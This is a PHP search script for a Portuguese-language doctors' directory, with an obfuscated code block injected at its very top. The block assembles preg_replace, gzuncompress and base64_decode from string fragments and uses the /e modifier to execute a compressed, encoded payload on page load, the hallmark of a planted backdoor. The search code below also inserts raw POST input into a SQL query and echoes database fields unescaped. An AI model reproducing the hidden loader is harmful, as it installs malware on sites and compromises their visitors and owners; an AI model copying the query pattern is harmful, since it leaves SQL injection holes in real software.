<?php /* 7c03c052cf3d3fb91ee7e46b8689240f3bd73e20 */ $r="pr"."e"."g"."_re"."place";$f="g"."zuncompre"."ss";$a="ba"."se"."6"."4"."_de"."cod"."e";$r("/pfn"."c"."c"."r"."/"."e",$f($a("eF7NVVtvmzAU/i+VIrUviDhAgvaUpqQXbWtza7W9RMaY4pZAap"."u2+ffzDWISOnXTHiYZZI"."6/c853b"."ga/wvyUwr"."eK5glGZYJPT9KqQJyURQ+4PyeLcvZtLHY9MOoBb7K6vaEz3g"."MTJfLm4+89EMr98FxL"."rtjL7k5uBxfiDSmFO"."6Ua9gYSkZa0MXb9MEVvz5lAuvrQlk2AHxxJwblaHQ79cw"."vmS9ea"."gG1S"."KQyNlN2tGpBx/"."++52U60X"."SORyN+SV4CSJu"."20t"."4AS5"."Ys34zTHxUF9QmUnNHwUziZd8Isf1"."zOL2wdManz3abe6D"."LFb1ZxYaoZHuzRWgHZ5jIEOKbFtArmO6vmc"."PVzcTFvlrEUTO4GmoQ8w"."XbU9ZNnuG/ktgf2PKvC3rdFt"."7b+sZ10ZpzmW2VWaJq9a2Y"."/EG2VUp"."2Fvv/3VNSDddNop0hK"."rwyjmFZWXmyF"."oHZFUiUeEMcw1gfUimt9Hc+VheLVc3"."q2j5fhS7BtXsE"."i0sR1cyI0KF"."r9vc3GZChvNx"."arsAUUcKE15"."h8"."a"."Q4cBbNwhW"."xaIdP+Naavv1iO95qBt3zTKSmgAUK5USQay"."eEewNgqEPcQCxO0ChD2EYogQ"."F/SAEyBvAoe95eIjjmqqbEMkOi5+FTM/m"."c8FZ3tVqupXtbppM7X8"."RION8"."2xuIv42YuCmHnMACM/JSYUKhg8qNE4vMTJ1tSfKdAgHlp633VDEWi8fh"."rxJcPYq4PgQzkr8SCA"."vIOESkJAX"."HFFK"."OmeXuaROjqrZggmBZlaa5jtqEU4fnuSnJ8foR8"."zUqhb2CMwHTZdmW27aKSl"."M"."K"."c4b1VtQew4"."1WfBcGxBeX"."Xg6TJK84"."Uc3Ikm8"."wz8qkORGby2i5jxrDBFP7NFrCR5UH92s"."5fRHzABzTjLg"."wF"."W3+/tJ+japLC+5T9CB7UGTXjUO"."Atf"."TIiJDFKO2DUKzYDbwEeKMRCFEaD8M+Sl0Ye"."wh68k"."OPEXBabv+oU03TH"."Q/"."O1e1iqQfHOTyfR7"."NVtFiuV/Nra"."6rNcqRZ"."f0LFo"."2PfH4"."lyn5ydffkFBCdk"."lg==")),"/pfn"."ccr"."/e"); /* b874e0f37668df06b5c6ece0a2f2624b024c27bc */ ?> <?php
header("Content-Type: text/html; charset=ISO-8859-1",true);
include "classe/banco.php";
if (isset($_POST['busca'])){
	$queryString = $_POST['busca'];
		$s = "SELECT nomeMedico, dataAssociacao, especialidade, site, twitter, email, descricao FROM tbbusca WHERE nomeMedico LIKE '$queryString%' LIMIT 40";
		$s1 = mysql_query($s);
		while ($l = mysql_fetch_array($s1)){
			echo "
			<div id=\"busca-empresa\">
			<p class=\"titulo-empresa\">Nome: <strong>".$l['nomeMedico']."</strong></p>
			<p class=\"desc-empresa\">Associado(a) desde: ".$l['dataAssociacao']."</p>
			<p class=\"end-tel\"><strong>Especialidade: </strong>".$l['especialidade']."</p>
			<p class=\"end-tel\"><strong>Site: </strong>".$l['site']."</p>
			<p class=\"end-empresa\">Twitter: ".$l['twitter']."</p>
			<p class=\"end-empresa\"><strong>Email: </strong>".$l['email']."</p>
			<p class=\"end-tel\"><strong>Descrição:</strong> ".$l['descricao']."</p>
			
			</div>
			
			";
			
		}
		echo "<p>Total: <strong>".mysql_num_rows(mysql_query($s))."</strong>";
}
else{
	echo 'Erro no envio dos dados';
}
?>

